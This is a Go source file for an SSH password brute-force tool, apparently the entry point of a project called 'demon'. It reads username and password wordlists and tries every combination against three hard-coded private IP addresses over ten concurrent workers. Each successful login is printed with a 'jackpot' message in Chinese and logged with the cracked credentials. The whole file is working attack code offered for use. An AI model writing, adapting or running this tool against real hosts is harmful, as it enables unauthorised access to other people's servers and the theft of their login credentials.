package main

import (
	"demon/internal/attack"
	"demon/internal/help"
	log "demon/internal/logger"
	"fmt"
	"os"
	"runtime/pprof"
	"sync"
)

type Task struct {
	ip       string
	user     string
	password string
}

func runTask(tasks []Task, threads int, logger *log.Logger) {
	var wg sync.WaitGroup
	taskCh := make(chan Task, threads*2)
	for i := 0; i < threads; i++ {
		go func() {
			for task := range taskCh {
				success, _ := attack.SSHLogin(task.ip, task.user, task.password)
				if success {
					fmt.Println("中大獎了!!! IP=", task.ip, "帳號=", task.user, "密碼=", task.password)
					logger.Info("破解成功", log.String("IP is", task.ip), log.String("User is", task.user), log.String("Password is", task.password))
				}
				wg.Done()
			}
		}()
	}
	for _, task := range tasks {
		wg.Add(1)
		taskCh <- task
	}
	wg.Wait()
	close(taskCh)
}

func main() {
	//Get cpu profile
	cpuFile, _ := os.OpenFile("cpu.prof", os.O_CREATE|os.O_RDWR, 0644)
	defer cpuFile.Close()
	pprof.StartCPUProfile(cpuFile)
	defer pprof.StopCPUProfile()
	//Get memory profile
	memFile, _ := os.OpenFile("memory.prof", os.O_CREATE|os.O_RDWR, 0644)
	defer memFile.Close()
	pprof.WriteHeapProfile(memFile)

	file, fileerr := os.OpenFile("./log/demon.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if fileerr != nil {
		panic(fileerr)
	}
	logger := log.NewLog(file, log.InfoLevel)
	//要破解的主機
	hack_ips := []string{"192.168.199.234", "192.168.199.235", "192.168.199.236"}
	//Read User and Password file
	users, err := help.ReadFile("./demo/sshBoom/user.txt")
	if err != nil {
		logger.Fatal("Read User Error:" + err.Error())
	}
	passwords, err := help.ReadFile("./demo/sshBoom/password.txt")
	if err != nil {
		logger.Fatal("Read Password Error:" + err.Error())
	}
	//爆破
	var tasks []Task
	for _, user := range users {
		for _, password := range passwords {
			for _, ip := range hack_ips {
				tasks = append(tasks, Task{ip, user, password})
			}
		}
	}
	runTask(tasks, 10, logger)
}
